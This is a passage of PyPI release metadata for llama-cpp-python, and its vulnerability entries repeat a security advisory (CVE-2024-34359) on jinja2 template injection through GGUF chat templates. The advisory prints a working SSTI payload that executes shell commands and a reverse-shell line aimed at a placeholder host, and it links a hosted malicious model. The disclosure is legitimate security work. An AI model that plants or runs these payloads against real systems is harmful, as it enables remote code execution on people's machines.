/>\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.49":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.49/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.49","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"21e971ceed04be64ca9ae36214ba94a8d271817ad83196af003db6435b9ca333","md5":"fbb741338f2e2af7a7a482245e4a60c0","sha256":"1fad402efebac9af031bf9ca41ee591e8ea70acf52a91730b8dcf01e8056187b"},"downloads":-1,"filename":"llama_cpp_python-0.2.49.tar.gz","has_sig":false,"md5_digest":"fbb741338f2e2af7a7a482245e4a60c0","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36684940,"upload_time":"2024-02-23T16:35:17","upload_time_iso_8601":"2024-02-23T16:35:17.510885Z","url":"https://files.pythonhosted.org/packages/21/e9/71ceed04be64ca9ae36214ba94a8d271817ad83196af003db6435b9ca333/llama_cpp_python-0.2.49.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.5":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.5/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.5","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"049d1f8fe06199b5fda5a691f23ef5622b32d5fe717da748f4fc2c9cbde60223","md5":"fedf0dc857e595958550fd1d5c3a0be3","sha256":"a255b3a3706d13327ce84517f700381e31c82fa815ec826d9e590a10e056b83d"},"downloads":-1,"filename":"llama_cpp_python-0.2.5.tar.gz","has_sig":false,"md5_digest":"fedf0dc857e595958550fd1d5c3a0be3","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1546332,"upload_time":"2023-09-14T22:35:18","upload_time_iso_8601":"2023-09-14T22:35:18.339782Z","url":"https://files.pythonhosted.org/packages/04/9d/1f8fe06199b5fda5a691f23ef5622b32d5fe717da748f4fc2c9cbde60223/llama_cpp_python-0.2.5.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.50":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.50/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.50","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e8ff492c54a6dde08db51fc4ae0b4c9f3e4c7bc5036eeab223ebdd51bc34a146","md5":"d412dd9c77509d7ab6885200aa36b7c6","sha256":"28caf4e665dac62ad1d347061b7a96669af7fb9e7f1e4e8c17e736504e321a51"},"downloads":-1,"filename":"llama_cpp_python-0.2.50.tar.gz","has_sig":false,"md5_digest":"d412dd9c77509d7ab6885200aa36b7c6","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36686652,"upload_time":"2024-02-23T17:41:12","upload_time_iso_8601":"2024-02-23T17:41:12.767971Z","url":"https://files.pythonhosted.org/packages/e8/ff/492c54a6dde08db51fc4ae0b4c9f3e4c7bc5036eeab223ebdd51bc34a146/llama_cpp_python-0.2.50.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the 